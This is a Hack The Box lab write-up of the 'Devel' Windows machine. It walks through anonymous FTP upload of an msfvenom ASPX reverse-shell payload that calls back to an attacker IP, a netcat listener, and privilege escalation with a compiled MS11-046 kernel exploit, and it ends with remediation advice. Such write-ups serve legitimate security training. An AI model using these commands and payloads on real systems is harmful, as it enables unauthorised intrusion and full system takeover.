# Hack The Box: Devel  🚩

**Date:** 2025-12-10

**OS:** Windows 7 / Server 2008

**Attacker IP:** 10.10.14.13

**Target IP:** 10.10.10.5

**Difficulty:** Easy/Beginner

---

## 🔍 1. Reconnaissance

### Nmap Scan
```
nmap -sC -sV 10.10.10.5
```
#### Outcome:

Port 21(FTP):Microsoft ftpd
  - anonymous login

Port 80(HTTP):Microsoft IIS httpd 7.5
  - Web-Server with ASP.net tecnology

---

## 💥 2. Vulnerability Analysis

From inspection FTP can login by anonymous username without password. when use command ```ls``` We found iisstart.htm and welcome.png which confirms that FTP root Directory is the same folder with Web-Server
  - Risk: Attacker can be upload malicious file through FTP and run that on web page instantly (RCE)

---

## ⚔️ 3. Exploitation

### Step 1: Payload Generation
Create .aspx file for revers shell using msfvenom and connect back to attacker machine
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 -f aspx -o shell.aspx
```
### Step 2: Uploading Payload
Connect FTP and upload file on server
```
ftp 10.10.10.5
> User: anonymous
> Pass: (blank)
> binary
> put shell.aspx
> bye
```
### Step 3: Gainning Access
Open Listener for waiting connection
```
nc -lvnp 443
```
Then execute file through Browser: http://10.10.10.5/shell.aspx

and We recieve reverse shell with iis apppool\web permission

---

## 🔑 4. Privilege Escalation

### System Enumeration

after got a shell check information with
```
systeminfo
```
OS Version: Microsoft Windows 7 Enterprise (6.1.7600 N/A Build 7600)

Hotfix(s): N/A (No Security Patch)

### Exploitation (MS11-046)

Because the system was an older version of Windows 7 without patches, the MS11-046 (Afd.sys) vulnerability was exploited to elevate privileges to SYSTEM level.

#### 1.Download and Compilie Exploit 

Since the target machine is Windows 7 32-bit (X86) and the exploit code is in C, we use the Cross-Compiler (mingw-w64) on Kali Linux to create a 32-bit .exe file that can be run on the target machine without running a Runtime Error.
```
searchsploit -m 40564.c
mv 40564.c MS11-046.c
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```
#### 2.Upload and Execute

```
#FTP
put MS11-046.exe
```
```
#victim
MS11-046.exe

whoami
```
#### Result: nt authority\system (Achieved System-Level Privilege)

---

## 🛡️ 4. Remediation

### 1.FTP Configuration:

  - Disable Anonymous Login immediately if not needed.

  - If Anonymous FTP is required, do not set the folder to the same folder as the Web Root (inetpub\wwwroot) and do not allow write permissions.

### 2.Patch Management:

  - Should upgrade to the latest version of Windows Server.

  - If upgrading is not possible, always keep security patches up to date to protect against kernel-level vulnerabilities (such as MS11-046).

### 3.Firewall:

  - Restrict access to Port 21 (FTP)
